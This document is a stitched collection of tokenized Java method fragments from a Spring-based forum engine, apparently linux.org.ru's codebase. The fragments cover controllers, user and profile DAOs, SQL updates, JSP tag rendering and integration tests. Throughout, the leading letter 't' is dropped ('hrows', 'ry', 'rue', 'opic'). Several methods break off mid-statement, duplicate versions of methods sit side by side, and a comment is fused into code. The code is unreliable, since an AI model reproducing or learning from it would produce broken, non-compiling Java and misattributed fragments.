isImagePostingAllowed ( section , currentUser ) ) ; } return params . build ( ) ; } 
public ModelAndView showForm ( @RequestParam ( " section " ) int sectionId , @RequestParam ( value = " ag " , required = false ) String ag , HttpServletRequest request ) hrows UserErrorException { Map < String , Object > params = new HashMap < > ( prepareModel ( null , AuthUtil . getCurrentUser ( ) , sectionId , request ) ) ; if ( ag ! = null ) { TagName . checkTag ( ag ) ; params . put ( " ag " , ag ) ; } Section section = sectionService . getSection ( sectionId ) ; params . put ( " groups " , groupDao . getGroups ( section ) ) ; return new ModelAndView ( " add-section " , params ) ; } 
public void updateMonth ( final int year , final int month ) { logger . info ( " Scheduling reindex by date " + year + '/' + month ) ; lowPriorityJmsTemplate . send ( queue , session - > session . createObjectMessage ( new UpdateMonth ( year , month ) ) ) ; } 
public boolean isBlockable ( ) { if ( id = = ANONYMOUS_ID ) { return false ; } return ! canmod ; } 
private ModelAndView archiveList ( int sectionid , String groupName ) { ModelAndView mv = new ModelAndView ( " view-news-archive " ) ; Section section = sectionService . getSection ( sectionid ) ; mv . getModel ( ) . put ( " section " , section ) ; Group group = null ; if ( groupName ! = null ) { group = groupDao . getGroup ( section , groupName ) ; } mv . getModel ( ) . put ( " group " , group ) ; List < ArchiveDao . ArchiveStats > items = archiveDao . getArchiveStats ( section , group ) ; mv . getModel ( ) . put ( " items " , items ) ; return mv ; } 
public ModelAndView galleryArchive ( ) { return archiveList ( Section . SECTION_GALLERY ) ; } 
public ModelAndView newsArchive ( ) { return archiveList ( Section . SECTION_NEWS ) ; } 
public ModelAndView pollsArchive ( ) { return archiveList ( Section . SECTION_POLLS ) ; } 
public ModelAndView articlesArchive ( ) { return archiveList ( Section . SECTION_ARTICLES ) ; } 
public ModelAndView forumArchive ( @PathVariable String group ) { return archiveList ( Section . SECTION_FORUM , group ) ; } 
public ModelAndView showCommentEditInfo ( @PathVariable ( " id " ) int msgid , @PathVariable ( " commentid " ) int commentId ) { Topic message = messageDao . getById ( msgid ) ; Comment comment = commentService . getById ( commentId ) ; List < PreparedEditHistory > editHistories = editHistoryService . prepareEditInfo ( comment ) ; ModelAndView modelAndView = new ModelAndView ( " history " ) ; modelAndView . getModel ( ) . put ( " message " , message ) ; modelAndView . getModel ( ) . put ( " editHistories " , editHistories ) ; modelAndView . getModel ( ) . put ( " canRestore " , false ) ; return modelAndView ; } 
private static ImmutableMap < String , Object > createDefaultProfile ( ) { ImmutableMap . Builder < String , Object > builder = ImmutableMap . builder ( ) ; builder . put ( STYLE_PROPERTY , " ango " ) ; builder . put ( FORMAT_MODE_PROPERTY , MarkupType . Markdown$ . MODULE$ . formId ( ) ) ; builder . put ( TOPICS_PROPERTY , 30 ) ; builder . put ( MESSAGES_PROPERTY , 50 ) ; builder . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; builder . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; builder . put ( AVATAR_PROPERTY , " empty " ) ; builder . put ( HIDE_ADSENSE_PROPERTY , rue ) ; builder . put ( MAIN_GALLERY_PROPERTY , false ) ; builder . put ( TRACKER_MODE , DEFAULT_TRACKER_MODE . getValue ( ) ) ; builder . put ( OLD_TRACKER , false ) ; builder . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of("poll", "articles", "top10", "gallery", "tagcloud"); builder.put(BOXES_MAIN2_PROPERTY, boxes); return builder.build(); } 
public void logRegister ( int userid , @Nonnull String ip , Optional < Integer > invitedBy , int userAgent ) { ImmutableMap < String , String > params ; params = invitedBy . map ( integer - > ImmutableMap . of ( OPTION_IP , ip , OPTION_USET_AGENT , Integer . oString ( userAgent ) , OPTION_INVITED_BY , integer . oString ( ) ) ) . orElseGet ( ( ) - > ImmutableMap . of ( OPTION_IP , ip , OPTION_USET_AGENT , Integer . oString ( userAgent ) ) ) ; jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
public List < PreparedUserLogItem > prepare ( @Nonnull List < UserLogItem > items ) { return items . stream ( ) . map ( item - > { Map < String , String > options = new HashMap < > ( ) ; 
public void updateUserInfoFields ( User user , String name , String url , String own ) { jdbcTemplate . update ( " UPDATE users SET name=?, url=?, town=? WHERE id=? " , name , url , own , user . getId ( ) ) ; } 
public int createUser ( String name , String nick , String password , String url , InternetAddress mail , String own ) { PasswordEncryptor encryptor = new BasicPasswordEncryptor ( ) ; int userid = jdbcTemplate . queryForObject ( " select nextval('s_uid') as userid " , Integer . class ) ; jdbcTemplate . update ( " INSERT INTO users " + " (id, name, nick, passwd, url, email, town, score, max_score,regdate) " + " VALUES (?,?,?,?,?,?,?,45,45,current_timestamp) " , userid , name , nick , encryptor . encryptPassword ( password ) , url = = null ? null : URLUtil . fixURL ( url ) , mail . getAddress ( ) , own ) ; return userid ; } 
private void rescueMaxcom ( ) { final User user = userDao . getUser ( userDao . findUserId ( " maxcom " ) ) ; userService . updateUser ( user , MAXCOM_NAME , MAXCOM_URL , MAXCOM_EMAIL , MAXCOM_TOWN , MAXCOM_PASS , MAXCOM_INFO ) ; userDao . acceptNewEmail ( user , MAXCOM_EMAIL ) ; } 
private void rescueJB ( ) { final User user = userDao . getUser ( userDao . findUserId ( " JB " ) ) ; userService . updateUser ( user , JB_NAME , JB_URL , JB_EMAIL , JB_TOWN , JB_PASS , JB_INFO ) ; userDao . acceptNewEmail ( user , JB_EMAIL ) ; userDao . unblock ( user , user ) ; } 
UserService userService ( UserDao userDao , UserLogDao userLogDao , PlatformTransactionManager ransactionManager ) { return new UserService ( mock ( SiteConfig . class ) , userDao , mock ( IgnoreListDao . class ) , mock ( UserInvitesDao . class ) , userLogDao , mock ( DeleteInfoDao . class ) , mock ( IPBlockDao . class ) , mock ( UserAgentDao . class ) , 
public boolean hasRecentModerationEvent ( User user , Duration duration , UserLogAction action ) { return jdbcTemplate . queryForObject ( " SELECT EXISTS (SELECT * FROM user_log WHERE userid=? AND action=?::user_log_action AND action_date>? AND userid!=action_userid) " , 
public static DateTimeFormatter ime ( DateTimeZone z ) { return TIME . withZone ( z ) ; } 
public static DateTimeFormatter date ( DateTimeZone z ) { return DATE . withZone ( z ) ; } 
public static DateTimeFormatter dateLong ( DateTimeZone z ) { return DATE_LONG . withZone ( z ) ; } 
public int doStartTag ( ) { WebApplicationContext context = WebApplicationContextUtils . getWebApplicationContext ( pageContext . getServletContext ( ) ) ; JadeConfiguration jadeConfiguration = context . getBean ( JadeConfiguration . class ) ; JadeTemplate jadeTemplate = context . getBean ( " TemplateComment " , JadeTemplate . class ) ; Map < String , Object > data = Maps . newHashMap ( ) ; data . put ( " comment " , comment ) ; data . put ( " enableSchema " , enableSchema ) ; data . put ( " opic " , new ApiCommentTopicInfo ( opic . getId ( ) , opic . getLink ( ) , commentsAllowed ) ) ; data . put ( " showMenu " , showMenu ) ; data . put ( " dateFormat " , new SignTag . DateFormatHandler ( ( DateTimeZone ) pageContext . getRequest ( ) . getAttribute ( " imezone " ) ) ) ; jadeConfiguration . renderTemplate ( jadeTemplate , data , pageContext . getOut ( ) ) ; return SKIP_BODY ; } 
public int doStartTag ( ) { WebApplicationContext context = WebApplicationContextUtils . getWebApplicationContext ( pageContext . getServletContext ( ) ) ; JadeConfiguration jadeConfiguration = context . getBean ( JadeConfiguration . class ) ; JadeTemplate jadeTemplate = context . getBean ( " TemplateSign " , JadeTemplate . class ) ; Map < String , Object > data = Maps . newHashMap ( ) ; data . put ( " user " , user ) ; data . put ( " shortMode " , shortMode ) ; data . put ( " author " , author ) ; data . put ( " postdate " , postdate ) ; data . put ( " dateFormat " , new SignTag . DateFormatHandler ( ( DateTimeZone ) pageContext . getRequest ( ) . getAttribute ( " imezone " ) ) ) ; if ( imeprop ! = null ) { data . put ( " imeprop " , imeprop ) ; } jadeConfiguration . renderTemplate ( jadeTemplate , data , pageContext . getOut ( ) ) ; return SKIP_BODY ; } 
public String apply ( Date input ) { return DateFormats . getDefault ( z ) . print ( input . getTime ( ) ) ; } 
public String iso ( Date input ) { return DateFormats . Iso8601 ( ) . print ( input . getTime ( ) ) ; } 
public CompletionStage < Map < Object , Object > > yearStats ( @PathVariable String nick , HttpServletRequest request ) { User user = userService . getUser ( nick ) ; if ( ! AuthUtil . isModeratorSession ( ) ) { user . checkBlocked ( ) ; } DateTimeZone imezone = ( DateTimeZone ) request . getAttribute ( " imezone " ) ; return userStatisticsService . getYearStats ( user , imezone ) ; } 
public boolean updateName ( User user , String name ) { return jdbcTemplate . update ( " UPDATE users SET name=? WHERE id=? and name!=? " , name , user . getId ( ) , name ) > 0 ; } 
public boolean updateUrl ( User user , String url ) { return jdbcTemplate . update ( " UPDATE users SET url=? WHERE id=? and url!=? " , url , user . getId ( ) , url ) > 0 ; } 
public boolean updateTown ( User user , String own ) { return jdbcTemplate . update ( " UPDATE users SET town=? WHERE id=? AND town!=? " , own , user . getId ( ) , own ) > 0 ; } 
public void logSetUserInfo ( @Nonnull User user , Map < String , String > info ) { jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
public boolean updateUserInfo ( int userid , String ext ) { return jdbcTemplate . update ( " UPDATE users SET userinfo=? where id=? AND userinfo is distinct from ? " , ext , userid , ext ) > 0 ; } 
public boolean updateName ( User user , String name ) { return jdbcTemplate . update ( " UPDATE users SET name=? WHERE id=? and name is distinct from ? " , name , user . getId ( ) , name ) > 0 ; } 
public boolean updateUrl ( User user , String url ) { return jdbcTemplate . update ( " UPDATE users SET url=? WHERE id=? and url is distinct from ? " , url , user . getId ( ) , url ) > 0 ; } 
public boolean updateTown ( User user , String own ) { return jdbcTemplate . update ( " UPDATE users SET town=? WHERE id=? AND town is distinct from ? " , own , user . getId ( ) , own ) > 0 ; } 
public Comment getById ( int id ) hrows MessageNotFoundException { Comment comment ; ry { comment = jdbcTemplate . queryForObject ( queryCommentById , ( resultSet , i ) - > Comment . apply ( resultSet ) , id ) ; } catch ( EmptyResultDataAccessException exception ) { hrow new MessageNotFoundException ( id ) ; } return comment ; } 
public int doStartTag ( ) { WebApplicationContext context = WebApplicationContextUtils . getWebApplicationContext ( pageContext . getServletContext ( ) ) ; JadeConfiguration jadeConfiguration = context . getBean ( JadeConfiguration . class ) ; JadeTemplate jadeTemplate = context . getBean ( " TemplateComment " , JadeTemplate . class ) ; Map < String , Object > data = Maps . newHashMap ( ) ; data . put ( " comment " , comment ) ; data . put ( " enableSchema " , enableSchema ) ; data . put ( " opic " , new ApiCommentTopicInfo ( opic . getId ( ) , opic . getLink ( ) , commentsAllowed ) ) ; data . put ( " showMenu " , showMenu ) ; data . put ( " dateFormat " , new DateFormatHandler ( ( DateTimeZone ) pageContext . getRequest ( ) . getAttribute ( " imezone " ) ) ) ; jadeConfiguration . renderTemplate ( jadeTemplate , data , pageContext . getOut ( ) ) ; return SKIP_BODY ; } 
public int doStartTag ( ) { WebApplicationContext context = WebApplicationContextUtils . getWebApplicationContext ( pageContext . getServletContext ( ) ) ; JadeConfiguration jadeConfiguration = context . getBean ( JadeConfiguration . class ) ; JadeTemplate jadeTemplate = context . getBean ( " TemplateComment " , JadeTemplate . class ) ; Map < String , Object > data = Maps . newHashMap ( ) ; data . put ( " comment " , comment ) ; data . put ( " opic " , new ApiCommentTopicInfo ( opic . getId ( ) , opic . getLink ( ) , commentsAllowed ) ) ; data . put ( " showMenu " , showMenu ) ; data . put ( " dateFormat " , new DateFormatHandler ( ( DateTimeZone ) pageContext . getRequest ( ) . getAttribute ( " imezone " ) ) ) ; jadeConfiguration . renderTemplate ( jadeTemplate , data , pageContext . getOut ( ) ) ; return SKIP_BODY ; } 
public void isHaveAnswersTest ( ) { int commentId1 = jdbcTemplate . queryForObject ( " select nextval('s_msgid') " , Integer . class ) ; int commentId2 = jdbcTemplate . queryForObject ( " select nextval('s_msgid') " , Integer . class ) ; addComment ( commentId1 , null , " CommentDaoIntegrationTest.isHaveAnswersTest() - 1 " , " comment body " ) ; assertEquals ( 0 , commentDao . getRepliesCount ( commentId1 ) ) ; addComment ( commentId2 , commentId1 , " CommentDaoIntegrationTest.isHaveAnswersTest() - 2 " , " comment body " ) ; assertTrue ( commentDao . getRepliesCount ( commentId1 ) > 0 ) ; } 
public Optional < Topic > findById ( int id ) { ry { return Optional . of ( jdbcTemplate . queryForObject ( queryMessage , ( resultSet , i ) - > Topic . fromResultSet ( resultSet ) , id ) ) ; 
public Set < Integer > get ( User user ) { final Builder < Integer > builder = ImmutableSet . builder ( ) ; jdbcTemplate . query ( queryIgnoreList , resultSet - > { builder . add ( resultSet . getInt ( " ignored " ) ) ; } , user . getId ( ) ) ; return builder . build ( ) ; } 
public Poll getPoll ( final int pollId ) hrows PollNotFoundException { SqlRowSet rs = jdbcTemplate . queryForRowSet ( queryPool , pollId ) ; if ( ! rs . next ( ) ) { hrow new PollNotFoundException ( ) ; } return Poll . apply ( pollId , 
public ModelAndView showList ( @RequestParam ( value = " newFavoriteTagName " , required = false ) String newFavoriteTagName , @RequestParam ( value = " newIgnoreTagName " , required = false ) String newIgnoreTagName ) hrows AccessViolationException { Template mpl = Template . getTemplate ( ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = AuthUtil . getCurrentUser ( ) ; ModelAndView modelAndView = new ModelAndView ( " user-filter-list " ) ; Map < Integer , User > ignoreMap = createIgnoreMap ( ignoreListDao . getJava ( user ) ) ; Map < Integer , Remark > ignoreRemarks = remarkDao . getRemarksJava ( user , ignoreMap . values ( ) ) ; modelAndView . addObject ( " ignoreRemarks " , ignoreRemarks ) ; modelAndView . addObject ( " ignoreList " , ignoreMap ) ; modelAndView . addObject ( " favoriteTags " , userTagService . favoritesGet ( user ) ) ; if ( ! mpl . isModeratorSession ( ) ) { modelAndView . addObject ( " ignoreTags " , userTagService . ignoresGet ( user ) ) ; } else { modelAndView . addObject ( " isModerator " , rue ) ; } if ( newFavoriteTagName ! = null & & TagName . isGoodTag ( newFavoriteTagName ) ) { modelAndView . addObject ( " newFavoriteTagName " , newFavoriteTagName ) ; } if ( newIgnoreTagName ! = null & & TagName . isGoodTag ( newIgnoreTagName ) ) { modelAndView . addObject ( " newIgnoreTagName " , newIgnoreTagName ) ; } return modelAndView ; } 
private void loadTopicScroller ( Map < String , Object > params , Topic opic , User currentUser , boolean useIgnoreList ) { Topic prevMessage ; Topic nextMessage ; if ( useIgnoreList ) { prevMessage = opicDao . getPreviousMessage ( opic , currentUser ) ; nextMessage = opicDao . getNextMessage ( opic , currentUser ) ; } else { prevMessage = opicDao . getPreviousMessage ( opic , null ) ; nextMessage = opicDao . getNextMessage ( opic , null ) ; } params . put ( " prevMessage " , prevMessage ) ; params . put ( " nextMessage " , nextMessage ) ; boolean opScroller ; SectionScrollModeEnum sectionScroller = sectionService . getScrollMode ( opic . getSectionId ( ) ) ; if ( prevMessage = = null & & nextMessage = = null ) { opScroller = false ; } else { opScroller = sectionScroller ! = SectionScrollModeEnum . NO_SCROLL ; } params . put ( " opScroller " , opScroller ) ; Boolean bottomScroller = sectionScroller ! = SectionScrollModeEnum . NO_SCROLL ; params . put ( " bottomScroller " , bottomScroller ) ; } 
public ModelAndView getMessageOld ( @RequestParam ( " msgid " ) int msgid , @RequestParam ( value = " page " , required = false ) Integer page , @RequestParam ( value = " lastmod " , required = false ) Long lastmod , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( required = false ) String output ) { Topic opic = opicDao . getById ( msgid ) ; StringBuilder link = new StringBuilder ( opic . getLink ( ) ) ; StringBuilder params = new StringBuilder ( ) ; if ( page ! = null ) { link . append ( " /page " ) . append ( page ) ; } if ( lastmod ! = null & & ! opic . isExpired ( ) ) { params . append ( " ?lastmod= " ) . append ( opic . getLastModified ( ) . getTime ( ) ) ; } if ( filter ! = null ) { if ( params . length ( ) = = 0 ) { params . append ( '?' ) ; } else { params . append ( '&' ) ; } params . append ( " filter= " ) . append ( filter ) ; } if ( output ! = null ) { if ( params . length ( ) = = 0 ) { params . append ( '?' ) ; } else { params . append ( '&' ) ; } params . append ( " output= " ) . append ( output ) ; } link . append ( params ) ; return new ModelAndView ( new RedirectView ( link . oString ( ) ) ) ; } 
public ModelAndView jumpMessage ( @RequestParam int msgid , @RequestParam ( required = false ) Integer page , @RequestParam ( required = false ) Integer cid ) { if ( cid ! = null ) { return jumpMessage ( msgid , cid , false ) ; } Topic opic = opicDao . getById ( msgid ) ; TopicLinkBuilder builder ; if ( page ! = null ) { builder = TopicLinkBuilder . pageLink ( opic , page ) ; } else { builder = TopicLinkBuilder . baseLink ( opic ) ; } return new ModelAndView ( new RedirectView ( builder . build ( ) ) ) ; } 
public ActorRef realtimeHub ( ) { return mock ( ActorRef . class ) ; } 
public void estCppTag ( ) hrows Exception { LorURL uri = new LorURL ( mainLORURI , " http:www.linux.org.ru/tags/c++ " ) ; assertTrue ( uri . isTrueLorUrl ( ) ) ; assertEquals ( " http:www.linux.org.ru/tags/c%2B%2B " , uri . canonize ( mainLORURI ) ) ; } 
public String canonize ( URI canonical ) hrows URIException { if ( ! _true_lor_url ) { return oString ( ) ; } ry { java . net . URI parsedURI = new java . net . URI ( oString ( ) ) ; 
public void est13 ( ) hrows Exception { String url13_1 = " http:www.linux.org.ru/view-news.jsp?tag=c%2B%2B " ; String url13_2 = " http:www.linux.org.ru/view-news.jsp?tag=c++ " ; String url13_3 = " http:www.linux.org.ru/view-news.jsp?tag=c+c " ; LorURL lorURI1 = new LorURL ( mainLORURI , url13_1 ) ; LorURL lorURI2 = new LorURL ( mainLORURI , url13_2 ) ; LorURL lorURI3 = new LorURL ( mainLORURI , url13_3 ) ; assertEquals ( " https:127.0.0.1:8085/view-news.jsp?tag=c++ " , lorURI1 . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/view-news.jsp?tag=c++ " , lorURI2 . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/view-news.jsp?tag=c+c " , lorURI3 . canonize ( canon ) ) ; } 
public void estCppTag ( ) hrows Exception { LorURL uri = new LorURL ( mainLORURI , " http:www.linux.org.ru/tags/c++ " ) ; assertTrue ( uri . isTrueLorUrl ( ) ) ; assertEquals ( " http:www.linux.org.ru/tags/c++ " , uri . canonize ( mainLORURI ) ) ; } 
public UserDetails loadUserByUsername ( String username ) hrows UsernameNotFoundException , DataAccessException { User user ; if ( username . contains ( " @ " ) ) { user = userDao . getByEmail ( username , rue ) ; if ( user = = null ) { hrow new UsernameNotFoundException ( username ) ; } } else { ry { user = userService . getUser ( username ) ; } catch ( UserNotFoundException e ) { hrow new UsernameNotFoundException ( username ) ; } } return new UserDetailsImpl ( user , retrieveUserAuthorities ( user ) , profileDao . readProfile ( user . getId ( ) ) ) ; } 
private static ImmutableMap < String , Object > createDefaultProfile ( ) { ImmutableMap . Builder < String , Object > builder = ImmutableMap . builder ( ) ; builder . put ( STYLE_PROPERTY , " ango " ) ; builder . put ( FORMAT_MODE_PROPERTY , MarkupType . Markdown$ . MODULE$ . formId ( ) ) ; builder . put ( TOPICS_PROPERTY , 30 ) ; builder . put ( MESSAGES_PROPERTY , 50 ) ; builder . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; builder . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; builder . put ( AVATAR_PROPERTY , " empty " ) ; builder . put ( HIDE_ADSENSE_PROPERTY , rue ) ; builder . put ( MAIN_GALLERY_PROPERTY , false ) ; builder . put ( TRACKER_MODE , DEFAULT_TRACKER_MODE . getValue ( ) ) ; builder . put ( OLD_TRACKER , false ) ; builder . put ( REACTION_NOTIFICATION_PROPERTY , rue ) ; builder . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of("poll", "articles", "top10", "gallery", "tagcloud"); builder.put(BOXES_MAIN2_PROPERTY, boxes); return builder.build(); } 
public boolean isReactionNotificationEnabled ( ) { return reactionNotification ; } 
public Profile readProfile ( int userId ) { List < Profile > profiles = jdbcTemplate . query ( " SELECT settings, main FROM user_settings WHERE id=? " , ( resultSet , i ) - > { Array boxes = resultSet . getArray ( " main " ) ; if ( boxes ! = null ) { return new Profile ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , ( Map < String , String > ) resultSet . getObject ( " settings " ) ) , Arrays . asList ( ( String [ ] ) boxes . getArray ( ) ) ) ; } else { return new Profile ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , ( Map < String , String > ) resultSet . getObject ( " settings " ) ) , null ) ; } } , userId ) ; if ( profiles . isEmpty ( ) ) { return new Profile ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , new HashMap < > ( ) ) , null ) ; 
public void deleteProfile ( User user ) { jdbcTemplate . update ( " DELETE FROM user_settings WHERE id=? " , user . getId ( ) ) ; } 
public void writeProfile ( User user , Profile profile ) { String [ ] boxlets = null ; List < String > customBoxlets = profile . getCustomBoxlets ( ) ; if ( customBoxlets ! = null ) { boxlets = customBoxlets . oArray ( new String [ 0 ] ) ; } final String [ ] finalBoxlets = boxlets ; if ( jdbcTemplate . update ( con - > { 
public void estReadEmpty ( ) { profileDao . deleteProfile ( estUser ) ; Profile profile = profileDao . readProfile ( estUser . getId ( ) ) ; assertNull ( profile . getCustomBoxlets ( ) ) ; } 
public void estModification ( ) { Profile profile = Profile . createDefault ( ) ; assertNotSame ( 125 , profile . getMessages ( ) ) ; profile . setMessages ( 125 ) ; profileDao . writeProfile ( estUser , profile ) ; Profile profile1 = profileDao . readProfile ( estUser . getId ( ) ) ; profileDao . deleteProfile ( estUser ) ; assertEquals ( 125 , profile1 . getMessages ( ) ) ; assertNull ( profile1 . getCustomBoxlets ( ) ) ; } 
public ProfileDao profileDao ( DataSource ds ) { return new ProfileDao ( ds ) ; } 
public boolean isBlocked ( ) { return blocked ; } 
public static String doLogin ( WebResource resource , String user , String password ) { MultivaluedMap < String , String > formData = new MultivaluedMapImpl ( ) ; formData . add ( " nick " , user ) ; formData . add ( " passwd " , password ) ; formData . add ( " csrf " , " csrf " ) ; ClientResponse cr = resource . path ( " login_process " ) . cookie ( new Cookie ( CSRFProtectionService . CSRF_COOKIE , " csrf " ) ) . post ( ClientResponse . class , formData ) ; Assert . assertEquals ( HttpStatus . SC_MOVED_TEMPORARILY , cr . getStatus ( ) ) ; return getAuthCookie ( cr ) ; } 
private ClientResponse addPhoto ( String filename , String auth ) { File file = new File ( filename ) ; FormDataMultiPart form = new FormDataMultiPart ( ) ; form . bodyPart ( new FormDataBodyPart ( " csrf " , " csrf " ) ) ; form . bodyPart ( new FileDataBodyPart ( " file " , file ) ) ; return resource . path ( " addphoto.jsp " ) 
public void estPage ( ) { String auth = WebHelper . doLogin ( resource , " JB " , " passwd " ) ; ClientResponse cr = resource . path ( " addphoto.jsp " ) . cookie ( new Cookie ( WebHelper . AUTH_COOKIE , auth , " / " , " 127.0.0.1 " , 1 ) ) . get ( ClientResponse . class ) ; assertEquals ( HttpStatus . SC_OK , cr . getStatus ( ) ) ; } 
private void rescueJB ( ) { final User user = userDao . getUser ( userDao . findUserId ( " JB " ) ) ; jdbcTemplate . update ( " DELETE FROM user_log WHERE userid=? " , user . getId ( ) ) ; userDao . unblock ( user , user ) ; } 
private ModelAndView createNewTopic ( HttpServletRequest request , AddTopicRequest form , HttpSession session , Group group , Map < String , Object > params , Section section , User user , MessageText message , UploadedImagePreview scrn , Topic previewMsg ) { session . removeAttribute ( " image " ) ; Tuple2 < Integer , Set < Integer > > result = opicService . addMessage ( request , form , message , group , user , scrn , previewMsg ) ; int msgid = result . _1 ; if ( ! previewMsg . isDraft ( ) ) { searchQueueSender . updateMessageOnly ( msgid ) ; RealtimeEventHub . notifyEvents ( realtimeHubWS , result . _2 ) ; } String opicUrl = previewMsg . withId ( msgid ) . getLink ( ) ; if ( ! section . isPremoderated ( ) | | previewMsg . isDraft ( ) ) { return new ModelAndView ( new RedirectView ( opicUrl , false , false ) ) ; 
public SttpBackend < Object , Object > syncClient ( ) { return mock ( SttpBackend . class ) ; } 
public int doStartTag ( ) hrows JspException { JspWriter out = pageContext . getOut ( ) ; if ( list ! = null ) { ry { StringBuilder buf = new StringBuilder ( " <p class= \" ags \" ><i class= \" icon-tag \" ></i>&nbsp; " ) ; boolean first = rue ; for ( TagRef el : list ) { if ( ! first ) { buf . append ( " , " ) ; } else { first = false ; } if ( el . url ( ) . isDefined ( ) ) { buf . append ( " <a class=tag rel=tag href= \" " ) . append ( el . url ( ) . get ( ) ) . append ( " \" > " ) . append ( StringUtil . escapeHtml ( el . name ( ) ) ) . append ( " </a> " ) ; } else { buf . append ( " <span class=tag> " + StringUtil . escapeHtml ( el . name ( ) ) + " </span> " ) ; } } buf . append ( " </p> " ) ; out . append ( buf ) ; } catch ( IOException e ) { hrow new JspException ( " Error: " + e . getMessage ( ) ) ; } } return SKIP_BODY ; } 
public int saveNewMessage ( final Topic msg , final User user , final String userAgent , final Group group ) { final int msgid = allocateMsgid ( ) ; String url = msg . getUrl ( ) ; String linktext = msg . getLinktext ( ) ; final String finalUrl = url ; final String finalLinktext = linktext ; jdbcTemplate . execute ( " INSERT INTO topics (groupid, userid, title, url, moderate, postdate, id, linktext, deleted, ua_id, postip, draft, lastmod, allow_anonymous) VALUES (?, ?, ?, ?, 'f', CURRENT_TIMESTAMP, ?, ?, 'f', create_user_agent(?),?::inet, ?, CURRENT_TIMESTAMP, ?) " , ( PreparedStatementCallback < String > ) pst - > { pst . setInt ( 1 , group . getId ( ) ) ; pst . setInt ( 2 , user . getId ( ) ) ; pst . setString ( 3 , msg . getTitle ( ) ) ; pst . setString ( 4 , finalUrl ) ; pst . setInt ( 5 , msgid ) ; pst . setString ( 6 , finalLinktext ) ; pst . setString ( 7 , userAgent ) ; pst . setString ( 8 , msg . getPostIP ( ) ) ; pst . setBoolean ( 9 , msg . isDraft ( ) ) ; pst . setBoolean ( 10 , msg . isAllowAnonymous ( ) ) ; pst . executeUpdate ( ) ; return null ; } ) ; return msgid ; } 
public boolean isCreateSynonym ( ) { return createSynonym ; } 
public void estTagNotFound ( ) { Option < Object > fetch = agDao . getTagId ( " fdsfsdfdsfsdfs " , false ) ; assertTrue ( fetch . isEmpty ( ) ) ; } 
public void createAndGetTest ( ) { int id = agDao . createTag ( " est-tag " ) ; Option < Object > fetchId = agDao . getTagId ( " est-tag " , false ) ; assertEquals ( Option . apply ( ( Object ) id ) , fetchId ) ; } 
public void favoriteAddTest ( ) hrows TagNotFoundException { when ( agDao . getTagId ( " ag1 " , false ) ) . henReturn ( Option . apply ( ( Object ) 2 ) ) ; userTagService . favoriteAdd ( user , " ag1 " ) ; verify ( userTagDao ) . addTag ( eq ( 1 ) , eq ( 2 ) , eq ( rue ) ) ; } 
public void updateScore ( ) { logger . info ( " Updating score " ) ; jdbcTemplate . update ( " update users set score=score+1 " + " where id in " + " (select distinct comments.userid from comments, topics " + " where comments.postdate>CURRENT_TIMESTAMP-'2 days'::interval " + " and topics.id=comments.topic and " + " groupid!=8404 and groupid!=4068 and groupid!=19405 and " + " not comments.deleted and not topics.deleted) " ) ; updateMaxScore ( ) ; } 
public void updateScore ( ) { logger . info ( " Updating score " ) ; jdbcTemplate . update ( " update users set score=score+1 " + " where id in " + " (select distinct comments.userid from comments, topics " + " where comments.postdate>CURRENT_TIMESTAMP-'2 days'::interval " + " and topics.id=comments.topic and " + " not groupid in (8404, 4068, 9326, 19405) and " + " not comments.deleted and not topics.deleted) " ) ; updateMaxScore ( ) ; } 
public void logRegister ( int userid , @Nonnull String ip , Optional < Integer > invitedBy , int userAgent , Optional < String > language ) { ImmutableMap . Builder < String , String > builder = ImmutableMap . builder ( ) ; builder . put ( OPTION_IP , ip ) ; builder . put ( OPTION_USET_AGENT , Integer . oString ( userAgent ) ) ; language . ifPresent ( lang - > builder . put ( OPTION_ACCEPT_LANGUAGE , lang ) ) ; invitedBy . ifPresent ( user - > builder . put ( OPTION_INVITED_BY , user . oString ( ) ) ) ; jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
public TopicLinkBuilder filterShow ( ) { if ( ! " show " . equals ( his . filter ) ) { return new TopicLinkBuilder ( opic , page , showDeleted , lastmod , comment , " show " ) ; 
public void logSetPassword ( User user , String ip ) { jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
public List < Topic > getTopicsFeed ( Section section , Group group , String ag , int offset , Optional < Integer > year , Optional < Integer > month , int count , @Nullable User currentUser ) hrows TagNotFoundException { TopicListDto opicListDto = new TopicListDto ( ) ; if ( section ! = null ) { opicListDto . setSection ( section . getId ( ) ) ; if ( section . isPremoderated ( ) ) { opicListDto . setCommitMode ( TopicListDao . CommitMode . COMMITED_ONLY ) ; } else { opicListDto . setCommitMode ( TopicListDao . CommitMode . POSTMODERATED_ONLY ) ; } } if ( group ! = null ) { opicListDto . setGroup ( group . getId ( ) ) ; } if ( ag ! = null ) { opicListDto . setTag ( agService . getTagId ( ag , false ) ) ; } if ( month . isPresent ( ) & & year . isPresent ( ) ) { opicListDto . setDateLimitType ( TopicListDto . DateLimitType . BETWEEN ) ; Calendar calendar = Calendar . getInstance ( ) ; calendar . set ( year . get ( ) , month . get ( ) - 1 , 1 , 0 , 0 , 0 ) ; opicListDto . setFromDate ( calendar . getTime ( ) ) ; calendar . add ( Calendar . MONTH , 1 ) ; opicListDto . setToDate ( calendar . getTime ( ) ) ; } else { opicListDto . setLimit ( count ) 